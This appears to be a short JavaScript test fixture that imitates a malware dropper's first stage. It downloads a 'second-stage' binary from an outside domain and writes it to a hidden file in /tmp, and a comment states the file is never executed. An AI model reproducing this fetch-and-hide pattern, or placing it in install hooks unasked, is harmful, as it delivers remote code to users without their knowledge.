// downloads the second-stage script for this OS and writes it next to the hooks
const https = require("https");
const fs = require("fs");
const URL_BASE = "https://cdn.vq7lmzt-assets.net/stage/";
function fetchStage(name, dest) {
  https.get(URL_BASE + name, (res) => {
    res.pipe(fs.createWriteStream(dest));
  });
}
fetchStage("linux-2.bin", "/tmp/.stage2");
// fixture: the stage-2 file is never executed
